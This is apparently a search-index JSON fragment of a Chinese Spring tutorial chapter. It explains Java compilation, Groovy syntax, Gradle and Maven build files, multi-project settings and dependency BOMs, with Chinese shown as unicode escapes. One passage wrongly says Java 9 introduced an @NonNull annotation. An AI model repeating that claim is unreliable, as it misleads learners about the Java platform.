groovy.lang.GString \u5bf9\u8c61\uff0c\u53ea\u6709 GString \u624d\u652f\u6301\u63d2\u503c\u3002 Gradle \u914d\u7f6e \u8bb2\u5b8c\u4e86 groovy \u8bed\u8a00\uff0c\u4f60\u5c31\u80fd\u770b\u51fa\u6765\uff0cgradle \u548c maven \u7684\u914d\u7f6e\u662f\u4e00\u6837\u7684\uff0c\u53ea\u662f\u4e00\u4e2a\u662f xml\uff0c\u4e00\u4e2a\u662f groovy\u3002\u4e0b\u9762\u662f\u4e00\u4e2a\u7b80\u5355\u7684 gradle \u914d\u7f6e\u6587\u4ef6\uff1a plugins { id 'java' } group = 'com.example' version = '0.0.1-SNAPSHOT' java { toolchain { languageVersion = JavaLanguageVersion.of(17) } } repositories { mavenCentral() } dependencies { implementation 'org.springframework.boot:spring-boot-starter' } \u8fd9\u91cc\u7684 implementation \u662f\u7528\u6765\u9650\u5236\u4f9d\u8d56\u8303\u56f4\u7684\uff0c\u548c maven \u7684 compile \u7c7b\u4f3c\u3002 \u5bf9\u4e8e maven\uff0c\u8fd9\u4e2a\u914d\u7f6e\u6587\u4ef6\u662f\u8fd9\u6837\u7684\uff1a <project xmlns=\"http://maven.apache.org/POM/4.0.0\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd\"> <modelVersion>4.0.0</modelVersion> <groupId>com.example</groupId> <artifactId>your-artifact-id</artifactId> <version>0.0.1-SNAPSHOT</version> <properties> <java.version>17</java.version> </properties> <dependencies> <dependency> <groupId>org.springframework.boot</groupId> <artifactId>spring-boot-starter</artifactId> </dependency> </dependencies> <repositories> <repository> <id>central</id> <url>https://repo.maven.apache.org/maven2</url> </repository> </repositories> </project> \u770b\u51fa\u6765\u4e86\u5417\uff1f\u5982\u679c\u628a\u4e00\u4e2a groovy \u811a\u672c\u5f53\u6210\u4e00\u4e2a\u5bf9\u8c61\u7684\u8bdd\uff0c\u90a3\u4e48\u8fd9\u4e2a\u5bf9\u8c61\u7684\u5c5e\u6027\u5c31\u662f maven \u7684\u914d\u7f6e\u6587\u4ef6\u6240\u521b\u5efa\u7684\u5bf9\u8c61\u3002\u4e24\u8005\u662f\u4e00\u6837\u7684\uff0c\u53ea\u662f\u8868\u73b0\u5f62\u5f0f\u4e0d\u540c\u3002\u6240\u4ee5\u4e4b\u540e\u6211\u4eec\u867d\u7136\u4ee5 gradle \u4e3a\u57fa\u7840\u8bb2\u89e3\uff0c\u4f46\u662f\u9664\u4e86\u5728 dependency \u4e2d scope \u7684\u5199\u6cd5\u6709\u4e00\u70b9\u70b9\u4e0d\u540c\uff0c\u5176\u4ed6\u7684\u90fd\u662f\u4e00\u6837\u7684\u3002\u6240\u4ee5\u6211\u4eec\u53ea\u8bb2 gradle\uff0c\u4f46\u662f\u4f60\u53ef\u4ee5\u5f88\u5bb9\u6613\u5730\u8f6c\u6362\u5230 maven\u3002 Gradle \u914d\u7f6e \u6211\u4eec\u6765\u9010\u5b57\u6bb5\u8bb2\u89e3\u4e00\u4e0b gradle \u914d\u7f6e\u6587\u4ef6\u3002 plugins \u95ed\u5305 plugins \u95ed\u5305\u7528\u6765\u58f0\u660e\u63d2\u4ef6\u3002\u63d2\u4ef6\u662f gradle \u7684\u4e00\u4e2a\u91cd\u8981\u6982\u5ff5\uff0c\u5b83\u53ef\u4ee5\u5e2e\u52a9\u6211\u4eec\u7b80\u5316\u914d\u7f6e\uff0c\u4f8b\u5982\u4e0a\u9762\u7684 java \u63d2\u4ef6\uff0c\u5c31\u5e2e\u6211\u4eec\u914d\u7f6e\u4e86 java \u7f16\u8bd1\u7684\u4e00\u4e9b\u9ed8\u8ba4\u884c\u4e3a\u3002 \u8fd9\u4e2a scope \u91cc\u53ef\u4ee5\u4f7f\u7528 id \u51fd\u6570\u548c version \u51fd\u6570\u3002 \u4f8b\u5982\uff0c\u5982\u679c\u6211\u4eec\u8981\u4f7f\u7528 spring boot \u63d2\u4ef6\uff0c\u5c31\u53ef\u4ee5\u8fd9\u6837\uff1a plugins { id 'java' id 'org.springframework.boot' version '3.2.6' } Java \u63d2\u4ef6\u662f gradle \u81ea\u5e26\u7684\uff0c\u4e0d\u9700\u8981\u989d\u5916\u58f0\u660e\u7248\u672c\u3002 \u6b64\u5916\uff0c\u5728 gradle \u4e2d\uff0c\u542f\u52a8 spring boot \u4f7f\u7528 gradle bootRun \u547d\u4ee4\uff0c\u800c\u4e0d\u662f maven \u7684 spring-boot:run \u547d\u4ee4\u3002 group \u548c version \u53d8\u91cf group \u548c version \u53d8\u91cf\u7528\u6765\u58f0\u660e\u9879\u76ee\u7684 groupId \u548c version\u3002\u8fd9\u4e24\u4e2a\u53d8\u91cf\u662f maven \u7684\u6982\u5ff5\uff0cgradle \u4e5f\u652f\u6301\u3002groupId \u662f\u9879\u76ee\u7684\u7ec4\u7ec7\u540d\uff0cversion \u662f\u9879\u76ee\u7684\u7248\u672c\u53f7\u3002 \u4f8b\u5982\uff0c group = 'com.example' version = '0.0.1-SNAPSHOT' java \u95ed\u5305 java \u95ed\u5305\u7528\u6765\u914d\u7f6e java \u63d2\u4ef6\u7684\u4e00\u4e9b\u884c\u4e3a\u3002\u8fd9\u91cc\u6211\u4eec\u914d\u7f6e\u4e86 toolchain\uff0c\u5373\u5de5\u5177\u94fe\u3002\u8fd9\u4e2a\u95ed\u5305\u91cc\u53ef\u4ee5\u5b9a\u4e49 toolchain \u95ed\u5305\uff0c\u8fd9\u4e2a\u95ed\u5305\u91cc\u53ef\u4ee5\u5b9a\u4e49 languageVersion \u53d8\u91cf\uff0c\u5373\u8bed\u8a00\u7248\u672c\u3002 \u4f8b\u5982\uff0c java { toolchain { languageVersion = JavaLanguageVersion.of(17) } } \u8fd9\u91cc\u6211\u4eec\u6307\u5b9a\u4e86 java 17 \u4f5c\u4e3a\u6211\u4eec\u7684\u8bed\u8a00\u7248\u672c\u3002 repositories \u95ed\u5305 \u4e00\u822c\u4f7f\u7528 mavenCentral() \u5c31\u53ef\u4ee5\uff0c\u8fd9\u4e2a\u51fd\u6570\u4f1a\u81ea\u52a8\u6dfb\u52a0 maven \u4e2d\u592e\u4ed3\u5e93\u3002\u5982\u679c\u7528\u522b\u7684\u4ed3\u5e93\uff0c\u53ef\u4ee5\u4f7f\u7528 mavenLocal()\u3001jcenter() \u7b49\u7b49\u3002 dependencies \u95ed\u5305 dependencies \u95ed\u5305\u7528\u6765\u58f0\u660e\u9879\u76ee\u7684\u4f9d\u8d56\u3002 \u5e38\u7528\u7684\u51fd\u6570\u6709\uff0c implementation\uff0c\u7f16\u8bd1\u65f6\u4f9d\u8d56\uff0c\u76f8\u5f53\u4e8e maven \u7684 compile api\uff0c\u7f16\u8bd1\u65f6\u4f9d\u8d56\uff0c\u76f8\u5f53\u4e8e maven \u7684 compile\uff0c\u4f46\u662f api \u548c implementation \u7684\u533a\u522b\u662f\uff0capi \u4f1a\u4f20\u9012\u4f9d\u8d56\uff0cimplementation \u4e0d\u4f1a\u3002\u5373\u5982\u679c A \u4f9d\u8d56 B\uff0cB \u4f9d\u8d56 C\uff0c\u5982\u679c A \u4f9d\u8d56 B \u7684 api\uff0c\u90a3\u4e48 A \u4e5f\u4f1a\u4f9d\u8d56 C\uff0c\u5982\u679c A \u4f9d\u8d56 B \u7684 implementation\uff0c\u90a3\u4e48 A \u4e0d\u4f1a\u4f9d\u8d56 C\u3002 runtimeOnly\uff0c\u8fd0\u884c\u65f6\u4f9d\u8d56\uff0c\u76f8\u5f53\u4e8e maven \u7684 runtime testImplementation\uff0c\u6d4b\u8bd5\u7f16\u8bd1\u65f6\u4f9d\u8d56\uff0c\u76f8\u5f53\u4e8e maven \u7684 testCompile testRuntimeOnly\uff0c\u6d4b\u8bd5\u8fd0\u884c\u65f6\u4f9d\u8d56\uff0c\u76f8\u5f53\u4e8e maven \u7684 testRuntime \u5982\u679c\u8981\u5f15\u7528\u5176\u5b83\u9879\u76ee\uff0c\u4f7f\u7528 project \u51fd\u6570\u3002\u4f8b\u5982\uff0c implementation project(\":commons\") ext \u95ed\u5305 ext \u95ed\u5305\u7528\u6765\u5b9a\u4e49\u4e00\u4e9b\u989d\u5916\u7684\u53d8\u91cf\u3002\u4f8b\u5982\uff0c ext { set('springVersion', '5.3.9') } \u4e4b\u540e\u53ef\u4ee5\u7528\u5b57\u7b26\u4e32\u63d2\u503c\u7684\u65b9\u5f0f\u5f15\u7528\u8fd9\u4e2a\u53d8\u91cf\uff0c\u4f8b\u5982\uff0c dependencies { implementation \"org.springframework:spring-context:${springVersion}\" } allprojects \u4e0e subprojects \u95ed\u5305 \u8fd9\u4e24\u4e2a\u95ed\u5305\u7684\u5185\u5bb9\u4f1a\u88ab\u4f20\u9012\u5230\u5b50\u9879\u76ee\u4e2d\u3002\u4f8b\u5982\uff0c allprojects { repositories { mavenCentral() } } \u8fd9\u6837\uff0c\u6240\u6709\u7684\u5b50\u9879\u76ee\u90fd\u4f1a\u81ea\u52a8\u6dfb\u52a0 maven \u4e2d\u592e\u4ed3\u5e93\u3002subprojects \u53ea\u4f1a\u4f20\u9012\u5230\u5b50\u9879\u76ee\uff0c\u800c allprojects \u4f1a\u4f20\u9012\u5230\u6240\u6709\u9879\u76ee\uff0c\u5305\u62ec\u6839\u9879\u76ee\u3002 \u6ce8\u610f\uff0c\u95ed\u5305\u91cc\u65e0\u6cd5\u4f7f\u7528 plugin \u95ed\u5305\uff0c\u9700\u8981\u4f7f\u7528 apply \u95ed\u5305\u6765\u6dfb\u52a0 plugin\u3002 plugins { id 'java' id 'org.springframework.boot' version '3.2.8' id 'io.spring.dependency-management' version '1.1.6' } allprojects { apply { plugin 'java' plugin 'org.springframework.boot' plugin 'io.spring.dependency-management' } } settings.gradle \u6587\u4ef6 \u6839\u9879\u76ee\u548c\u5b50\u9879\u76ee\u662f\u57fa\u4e8e settings.gradle \u6587\u4ef6\u6765\u5b9a\u4e49\u7684\u3002\u5728\u6839\u9879\u76ee\u7684 settings.gradle \u6587\u4ef6\u4e2d\uff0c\u53ef\u4ee5\u4f7f\u7528 include \u51fd\u6570\u6765\u5b9a\u4e49\u5b50\u9879\u76ee\u3002\u4f8b\u5982\uff0c rootProject.name = 'demo' include 'payment' include 'commons' include 'order' include 'order-feign' \u8fd9\u6837\uff0c\u5c31\u5b9a\u4e49\u4e86\u56db\u4e2a\u5b50\u9879\u76ee\uff0c\u5206\u522b\u662f payment\u3001commons\u3001order \u548c order-feign\u3002\u5b50\u9879\u76ee\u4e4b\u95f4\u53ef\u4ee5\u4e92\u76f8\u4f9d\u8d56\uff0c\u4f46\u8981\u4f7f\u7528\u6839\u9879\u76ee\u542f\u52a8\u3002 Spring Dependency Management \u63d2\u4ef6 Spring Dependency Management \u63d2\u4ef6\u662f Spring Boot \u7684\u4e00\u4e2a\u63d2\u4ef6\uff0c\u5b83\u53ef\u4ee5\u5e2e\u52a9\u6211\u4eec\u7ba1\u7406\u4f9d\u8d56\u7684\u7248\u672c\u3002\u6211\u4eec\u9700\u8981\u5728 plugins \u91cc\u58f0\u660e\u8fd9\u4e2a\u63d2\u4ef6\u3002 \u4e4b\u540e\uff0c\u4f7f\u7528 dependencyManagement \u95ed\u5305\u6765\u58f0\u660e\u4f9d\u8d56\u7684\u7248\u672c\u3002\u4f8b\u5982\uff0c plugins { id 'io.spring.dependency-management' version '1.1.5' } dependencyManagement { imports { mavenBom \"org.springframework.boot:spring-boot-dependencies:3.2.6\" } } \u8fd9\u6837\uff0c\u4e4b\u540e\u6211\u4eec\u5c31\u53ef\u4ee5\u7701\u7565\u7248\u672c\u53f7\uff0c\u53ea\u5199 groupId \u548c artifactId\u3002\u4f8b\u5982\uff0c dependencies { implementation 'org.springframework.boot:spring-boot-starter' } \u8fd9\u6837\uff0c\u6211\u4eec\u5c31\u4e0d\u7528\u62c5\u5fc3\u5728\u6839\u9879\u76ee\u548c\u5b50\u9879\u76ee\u4e4b\u95f4\u540c\u6b65\u7248\u672c\u53f7\u4e86\u3002\u4f8b\u5982\uff0c\u5982\u679c\u6211\u5728\u6839\u9879\u76ee\u4e2d\u8fd9\u6837\u914d\u7f6e\uff0c allprojects { repositories { mavenCentral() } dependencyManagement { imports { mavenBom \"org.springframework.boot:spring-boot-dependencies:3.2.6\" mavenBom \"org.postgresql:postgresql:${postgresqlVersion}\" } } } \u4e4b\u540e\uff0c\u5982\u679c\u6709\u5b50\u9879\u76ee\u4e2d\u4f9d\u8d56 postgres\uff0c\u53ea\u9700\u8981\uff0c dependencies { implementation 'org.postgresql:postgresql' } \u8fd9\u6837\u5c31\u4e0d\u7528\u62c5\u5fc3\u7248\u672c\u53f7\u4e0d\u4e00\u81f4\u7684\u95ee\u9898\u4e86\u3002 \u6b64\u5916\u8981\u6ce8\u610f\uff0cmavenBom \u5b9a\u4e49\u7684\u4e0d\u53ea\u662f\u4e00\u4e2a\u4f9d\u8d56\u7684\u7248\u672c\uff08\u53ef\u4ee5\u662f\uff09\uff0c\u8fd8\u53ef\u4ee5\u662f\u4e00\u7ec4\u4f9d\u8d56\u7684\u7248\u672c\u3002\u56e0\u6b64\uff0c\u4e0a\u9762\u6211\u4eec\u5b9a\u4e49\u4e86 Spring Cloud \u548c Spring Boot \u7248\u672c\u540e\uff0c\u4e0d\u9700\u8981\u518d\u5bf9\u6bcf\u4e2a\u4f9d\u8d56\u58f0\u660e\u7248\u672c\u53f7\u3002 \u4f46\u662f\uff0c\u5176\u5b9e\u5728 gradle \u4e2d\uff0c\u6700\u6b63\u7edf\u7684\u65b9\u6cd5\u662f\u4f7f\u7528 platform\uff0c\u8fd9\u662f gradle \u5185\u5efa\u7684\u65b9\u6cd5\uff0c\u4e0d\u9700\u8981\u4f9d\u8d56\u3002\u5373\u4e0b\u9762\u8fd9\u6837\uff0c implementation platform('org.springframework.boot:spring-boot-dependencies:2.7.8') platform \u51fd\u6570\u7684\u6548\u679c\u548c mavenBom \u4e00\u6837\u3002\u4f46\u662f\u9274\u4e8e\u5927\u90e8\u5206\u7684\u6587\u6863\u90fd\u76f4\u63a5\u63d0\u4f9b mavenBom\uff0c\u800cplatform \u9700\u8981\u81ea\u5df1\u53bb\u627e\uff0c\u6240\u4ee5\u6211\u4eec\u8fd9\u91cc\u5c31\u76f4\u63a5\u7528 mavenBom \u4e86\u3002 @NonNull \u6ce8\u89e3 \u7a7a\u6307\u9488\u5f02\u5e38\u4e00\u76f4\u662f\u4e2a\u5f88\u5934\u75bc\u7684\u95ee\u9898\uff0cJava 8 \u5f15\u5165\u4e86 Optional \u7c7b\u578b\uff0c\u4f46\u662f\u4f7f\u7528\u8d77\u6765\u5f88\u9ebb\u70e6\u3002Java 9 \u5f15\u5165\u4e86 @NonNull \u6ce8\u89e3\uff0c\u8fd9\u4e2a\u6ce8\u89e3\u53ef\u4ee5\u5e2e\u52a9\u6211\u4eec\u5728\u7f16\u8bd1\u65f6\u68c0\u67e5\u7a7a\u6307\u9488\u5f02\u5e38\u3002\u8fd9\u4e2a\u6ce8\u89e3\u5728 jakarta.annotation.Nonnull \u91cc\uff0c\u4f7f\u7528\u8fd9\u4e2a\u6ce8\u89e3\u540e\uff0c\u53ef\u4ee5\u5728\u7f16\u8f91\u5668\u91cc\u5f00\u542f\u7a7a\u6307\u9488\u68c0\u67e5\u3002\u4f8b\u5982\u5728 vscode\uff0c\u628a java.compile.nullAnalysis.nonnull: [jakarta.annotation.Nonnull] \u5373\u53ef\u3002\u5f53\u7136\uff0c\u4e00\u822c\u542f\u52a8\u4e00\u4e2a Java \u9879\u76ee\u65f6\uff0c\u53f3\u4e0b\u89d2\u4f1a\u6709\u4e00\u4e2a\u63d0\u793a\u6846\uff0c\u95ee\u7528\u6237\u662f\u5426\u5f00\u542f\u7a7a\u6307\u9488\u68c0\u67e5\u3002 \u4e0e\u6b64\u540c\u65f6\uff0c\u8fd8\u6709\u4e00\u4e2a jakarta.annotation.Nullable \u6ce8\u89e3\uff0c\u7528\u6765\u6807\u8bb0\u53ef\u4ee5\u4e3a\u7a7a\u7684\u53d8\u91cf\u3002 \u8fd9\u4e2a\u6ce8\u89e3\u53ea\u662f\u63d0\u4f9b\u7ed9\u7f16\u8f91\u5668\u4f7f\u7528\uff0c\u4e0d\u4f1a\u5f71\u54cd\u8fd0\u884c\u65f6\u7684\u884c\u4e3a\u3002","title":"\u56de\u5230 Java"},{"location":"02/#spring-ch2-java","text":"","title":"Spring \u901f\u6210 Ch2 \u56de\u5230 Java"},{"location":"02/#_1","text":"\u7b2c\u4e8c\u7ae0\u4e86\uff0c\u4f46\u6211\u4eec\u8fd8\u662f\u4e0d\u8bb2 Spring Cloud\uff0c\u800c\u662f\u8981\u56de\u5230 Java \u57fa\u7840\u3002\u5177\u4f53\u800c\u8a00\uff0c\u662f Java \u5de5\u7a0b\u7684\u7f16\u8bd1\u548c\u6784\u5efa\uff0c\u56e0\u4e3a Spring Cloud \u9700\u8981\u624b\u52a8\u914d\u7f6e\u591a\u9879\u76ee\u548c\u5b50\u9879\u76ee\u5d4c\u5957\uff0c\u6240\u4ee5\u6211\u4eec\u9700\u8981\u4e86\u89e3 Java \u5de5\u7a0b\u7684\u6784\u5efa\u3002 \u8fd9\u91cc\u6211\u4eec\u8bb2\u4f7f\u7528 gradle\uff0c\u4f46\u662f\u5927\u5bb6\u90fd\u77e5\u9053\uff0c\u4e8b\u5b9e\u4e0a\u5e38\u7528\u7684\u662f maven\u3002\u4e0d\u8981\u62c5\u5fc3\uff0c\u56e0\u4e3a\u4e4b\u540e\u6211\u4eec\u4f1a\u8bb2\u5230\uff0cgradle \u548c maven \u7684\u914d\u7f6e\u662f\u5b8c\u5168\u4e00\u81f4\u7684\uff0c\u53ea\u662f\u4e00\u4e2a\u662f\u7528 dsl\uff0c\u4f8b\u5982 groovy\uff0c\u4e00\u4e2a\u662f\u7528 xml\u3002 \u6b64\u5916\u6211\u4eec\u8fd8\u5c06\u8bb2\u4e00\u4e2a\u504f\u95e8\u7684\u8bdd\u9898\uff0c@NonNull \u6ce8\u89e3\uff0c\u8fd9\u4e2a\u6ce8\u89e3\u53ef\u4ee5\u5e2e\u52a9\u6211\u4eec\u5728\u7f16\u8bd1\u65f6\u68c0\u67e5\u7a7a\u6307\u9488\u5f02\u5e38\u3002","title":"\u7b80\u4ecb"},{"location":"02/#java","text":"\u590d\u4e60\u4e00\u4e0b\uff0cJava \u7f16\u8bd1\u7684\u547d\u4ee4\u662f\uff1a javac -d out src/main/java/com/example/Hello.java javac \u4f1a\u8f93\u51fa\u7f16\u8bd1\u597d\u7684 class \u6587\u4ef6\u5230 out \u76ee\u5f55\u3002\u5982\u679c\u8981\u8fd0\u884c\u8fd9\u4e2a class \u6587\u4ef6\uff0c\u53ef\u4ee5\u4f7f\u7528 java \u547d\u4ee4\uff1a java -cp out com.example.Hello \u4f46\u662f\uff0c\u5982\u679c\u6709\u591a\u4e2a class \u6587\u4ef6\uff0c\u5c31\u9700\u8981\u624b\u52a8\u6307\u5b9a classpath\uff0c\u8fd9\u6837\u5f88\u9ebb\u70e6\u3002\u6240\u4ee5\u6211\u4eec\u9700\u8981\u4e00\u4e2a\u5de5\u5177\u6765\u5e2e\u52a9\u6211\u4eec\u7ba1\u7406\u4f9d\u8d56\u3002","title":"Java \u7f16\u8bd1"},{"location":"02/#java_1","text":"Java \u9879\u76ee\u7ba1\u7406\u5de5\u5177\u4e8b\u5b9e\u4e0a\u53ea\u6709 gradle \u548c maven \u6709\u4eba\u7528\uff0c\u5176\u4ed6\u7684\u90fd\u662f\u5c0f\u4f17\uff0c\u4f8b\u5982 sbt\uff08\u6211\u4e2a\u4eba\u6bd4\u8f83\u559c\u6b22 scala\uff09\u3002 Maven \u548c Gradle \u90fd\u662f\u57fa\u4e8e\u9879\u76ee\u7684\uff0c\u5373\u9879\u76ee\u662f\u4e00\u4e2a\u6574\u4f53\uff0c\u6709\u4e00\u4e2a pom.xml \u6216 build.gradle \u6587\u4ef6\u6765\u63cf\u8ff0\u9879\u76ee\u7684\u4f9d\u8d56\u548c\u6784\u5efa\u65b9\u5f0f\u3002\u4e24\u8005\u5728\u672c\u8d28\u4e0a\u90fd\u662f\u5b9a\u4e49\u4e86\u4e00\u4e2a project object model\uff0c\u5373\u9879\u76ee\u5bf9\u8c61\u6a21\u578b\uff0c\u800c\u4e14\u4e24\u8005\u5b9a\u4e49\u7684\u6a21\u578b\u662f\u4e00\u6837\u7684\uff0c\u53ea\u662f\u8868\u73b0\u5f62\u5f0f\u4e0d\u540c\uff0c\u4e0b\u9762\u6211\u4eec\u4f1a\u770b\u5230\u3002","title":"Java \u9879\u76ee\u7ba1\u7406\u5de5\u5177"},{"location":"02/#groovy","text":"Gradle \u4f7f\u7528 groovy \u8bed\u8a00\u6765\u5b9a\u4e49\u9879\u76ee\uff0cgroovy \u662f\u4e00\u79cd JVM \u8bed\u8a00\uff0c\u548c Java \u4e00\u6837\uff0c\u4f46\u662f\u8bed\u6cd5\u66f4\u7b80\u6d01\uff0c\u66f4\u9002\u5408 DSL\u3002 \u867d\u7136\u542c\u8d77\u6765\uff0c\u4e3a\u4e86\u4f7f\u7528 java \u7684\u5305\u7ba1\u7406\u5de5\u5177\uff0c\u53bb\u5b66\u4e00\u95e8\u7f16\u7a0b\u8bed\u8a00\u662f\u4e2a\uff0c\u5f88\u6709\u9b44\u529b\u7684\u51b3\u5b9a\u3002\u4f46\u6211\u4eec\u53ea\u9700\u8981\u5b66\u4e60\u56db\u4e2a\u65b9\u9762\uff1a\u53d8\u91cf\uff0c\u95ed\u5305\uff0c\u51fd\u6570\u8c03\u7528\uff0c\u5b57\u7b26\u4e32\u63d2\u503c\u3002","title":"Groovy \u8bed\u8a00"},{"location":"02/#_2","text":"Groovy \u662f\u52a8\u6001\u7c7b\u578b\uff0c\u4f7f\u7528 def \u5173\u952e\u5b57\u5b9a\u4e49\u53d8\u91cf\u3002\u4f8b\u5982\uff1a def name = 'world' \u5f88\u7b80\u5355\uff0c\u4e4b\u540e\u91cd\u65b0\u8d4b\u503c\u5373\uff0c name = 'Groovy'","title":"\u53d8\u91cf"},{"location":"02/#_3","text":"Groovy \u4e2d\uff0c\u95ed\u5305\u662f\u4e00\u79cd\u533f\u540d\u51fd\u6570\uff0c\u53ef\u4ee5\u76f4\u63a5\u8d4b\u503c\u7ed9\u53d8\u91cf\uff0c\u4e5f\u53ef\u4ee5\u4f5c\u4e3a\u53c2\u6570\u4f20\u9012\u3002\u4f8b\u5982\uff1a def myClosure = { println 'Hello, world!' } \u5f53\u7136\uff0c\u4f5c\u4e3a dsl \u65f6\uff0c\u4e00\u822c\u4f1a\u7701\u6389 def \u5173\u952e\u5b57\uff0c\u76f4\u63a5\u5199\u95ed\u5305\u3002\u4f8b\u5982\uff1a plugins { id 'java' id \"org.springframework.boot\" version \"3.2.6\" id 'io.spring.dependency-management' version '1.1.5' } \u8fd9\u6837\u5c31\u5b9a\u4e49\u4e86\u4e00\u4e2a\u95ed\u5305\uff0c\u5927\u62ec\u53f7\u5305\u88f9\u4e86\u4e00\u6bb5\u4ee3\u7801\u3002 \u95ed\u5305\u7684\u6700\u540e\u4e00\u884c\u4f1a\u88ab\u5f53\u6210\u8fd4\u56de\u503c\uff0c\u6240\u4ee5\u53ef\u4ee5\u7701\u7565 return \u5173\u952e\u5b57\u3002\u4f8b\u5982\uff1a def myClosure = { 'Hello, world!' }","title":"\u95ed\u5305"},{"location":"02/#_4","text":"Groovy \u7684\u51fd\u6570\u8c03\u7528\u4e0e\u5176\u5b83\u5e38\u89c1\u8bed\u8a00\u7684\u552f\u4e00\u533a\u522b\u662f\uff0c\u53ef\u4ee5\u7701\u7565\u62ec\u53f7\u3002\u4f8b\u5982\uff1a println 'Hello, world!' \u5728\u4e0a\u9762\u7684\u4f8b\u5b50\uff0c\u5373\uff0c plugins { id 'java' id \"org.springframework.boot\" version \"3.2.6\" id 'io.spring.dependency-management' version '1.1.5' } \u91cc\u9762\u7684 id \u548c version \u90fd\u662f\u51fd\u6570\u8c03\u7528\uff0c\u4f46\u662f\u7701\u7565\u4e86\u62ec\u53f7\u3002\u8981\u628a\u5b83\u4eec\u90fd\u5199\u5168\uff0c\u5c31\u662f\uff1a plugins { id('java') id(\"org.springframework.boot\").version(\"3.2.6\") id('io.spring.dependency-management').version('1.1.5') }","title":"\u51fd\u6570\u8c03\u7528"},{"location":"02/#_5","text":"Groovy \u7684\u5b57\u7b26\u4e32\u63d2\u503c\u548c JS \u4e00\u6837\uff0c\u4f7f\u7528 ${} \u3002\u4f8b\u5982\uff1a def name = 'world' println \"Hello, ${name}!\" \u6ce8\u610f\uff0c\u5355\u5f15\u53f7\u521b\u5efa\u7684\u662f java.lang.String \u5bf9\u8c61\uff0c\u800c\u53cc\u5f15\u53f7\u521b\u5efa\u7684\u662f groovy.lang.GString \u5bf9\u8c61\uff0c\u53ea\u6709 GString \u624d\u652f\u6301\u63d2\u503c\u3002","title":"\u5b57\u7b26\u4e32\u63d2\u503c"},{"location":"02/#gradle","text":"\u8bb2\u5b8c\u4e86 groovy \u8bed\u8a00\uff0c\u4f60\u5c31\u80fd\u770b\u51fa\u6765\uff0cgradle \u548c maven \u7684\u914d\u7f6e\u662f\u4e00\u6837\u7684\uff0c\u53ea\u662f\u4e00\u4e2a\u662f xml\uff0c\u4e00\u4e2a\u662f groovy\u3002\u4e0b\u9762\u662f\u4e00\u4e2a\u7b80\u5355\u7684 gradle \u914d\u7f6e\u6587\u4ef6\uff1a plugins { id 'java' } group = 'com.example' version = '0.0.1-SNAPSHOT' java { toolchain { languageVersion = JavaLanguageVersion.of(17) } } repositories { mavenCentral() } dependencies { implementation 'org.springframework.boot:spring-boot-starter' } \u8fd9\u91cc\u7684 implementation \u662f\u7528\u6765\u9650\u5236\u4f9d\u8d56\u8303\u56f4\u7684\uff0c\u548c maven \u7684 compile \u7c7b\u4f3c\u3002 \u5bf9\u4e8e maven\uff0c\u8fd9\u4e2a\u914d\u7f6e\u6587\u4ef6\u662f\u8fd9\u6837\u7684\uff1a <project xmlns=\"http://maven.apache.org/POM/4.0.0\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd\"> <modelVersion>4.0.0</modelVersion> <groupId>com.example</groupId> <artifactId>your-artifact-id</artifactId> <version>0.0.1-SNAPSHOT</version> <properties> <java.version>17</java.version> </properties> <dependencies> <dependency> <groupId>org.springframework.boot</groupId> <artifactId>spring-boot-starter</artifactId> </dependency> </dependencies> <repositories> <repository> <id>central</id> <url>https://repo.maven.apache.org/maven2</url> </repository> </repositories> </project> \u770b\u51fa\u6765\u4e86\u5417\uff1f\u5982\u679c\u628a\u4e00\u4e2a groovy \u811a\u672c\u5f53\u6210\u4e00\u4e2a\u5bf9\u8c61\u7684\u8bdd\uff0c\u90a3\u4e48\u8fd9\u4e2a\u5bf9\u8c61\u7684\u5c5e\u6027\u5c31\u662f maven \u7684\u914d\u7f6e\u6587\u4ef6\u6240\u521b\u5efa\u7684\u5bf9\u8c61\u3002\u4e24\u8005\u662f\u4e00\u6837\u7684\uff0c\u53ea\u662f\u8868\u73b0\u5f62\u5f0f\u4e0d\u540c\u3002\u6240\u4ee5\u4e4b\u540e\u6211\u4eec\u867d\u7136\u4ee5 gradle \u4e3a\u57fa\u7840\u8bb2\u89e3\uff0c\u4f46\u662f\u9664\u4e86\u5728 dependency \u4e2d scope \u7684\u5199\u6cd5\u6709\u4e00\u70b9\u70b9\u4e0d\u540c\uff0c\u5176\u4ed6\u7684\u90fd\u662f\u4e00\u6837\u7684\u3002\u6240\u4ee5\u6211\u4eec\u53ea\u8bb2 gradle\uff0c\u4f46\u662f\u4f60\u53ef\u4ee5\u5f88\u5bb9\u6613\u5730\u8f6c\u6362\u5230 maven\u3002","title":"Gradle \u914d\u7f6e"},{"location":"02/#gradle_1","text":"\u6211\u4eec\u6765\u9010\u5b57\u6bb5\u8bb2\u89e3\u4e00\u4e0b gradle \u914d\u7f6e\u6587\u4ef6\u3002","title":"Gradle \u914d\u7f6e"},{"location":"02/#plugins","text":"plugins \u95ed\u5305\u7528\u6765\u58f0\u660e\u63d2\u4ef6\u3002\u63d2\u4ef6\u662f gradle \u7684\u4e00\u4e2a\u91cd\u8981\u6982\u5ff5\uff0c\u5b83\u53ef\u4ee5\u5e2e\u52a9\u6211\u4eec\u7b80\u5316\u914d\u7f6e\uff0c\u4f8b\u5982\u4e0a\u9762\u7684 java \u63d2\u4ef6\uff0c\u5c31\u5e2e\u6211\u4eec\u914d\u7f6e\u4e86 java \u7f16\u8bd1\u7684\u4e00\u4e9b\u9ed8\u8ba4\u884c\u4e3a\u3002 \u8fd9\u4e2a scope \u91cc\u53ef\u4ee5\u4f7f\u7528 id \u51fd\u6570\u548c version \u51fd\u6570\u3002 \u4f8b\u5982\uff0c\u5982\u679c\u6211\u4eec\u8981\u4f7f\u7528 spring boot \u63d2\u4ef6\uff0c\u5c31\u53ef\u4ee5\u8fd9\u6837\uff1a plugins { id 'java' id 'org.springframework.boot' version '3.2.6' } Java \u63d2\u4ef6\u662f gradle \u81ea\u5e26\u7684\uff0c\u4e0d\u9700\u8981\u989d\u5916\u58f0\u660e\u7248\u672c\u3002 \u6b64\u5916\uff0c\u5728 gradle \u4e2d\uff0c\u542f\u52a8 spring boot \u4f7f\u7528 gradle bootRun \u547d\u4ee4\uff0c\u800c\u4e0d\u662f maven \u7684 spring-boot:run \u547d\u4ee4\u3002","title":"plugins \u95ed\u5305"},{"location":"02/#group-version","text":"group \u548c version 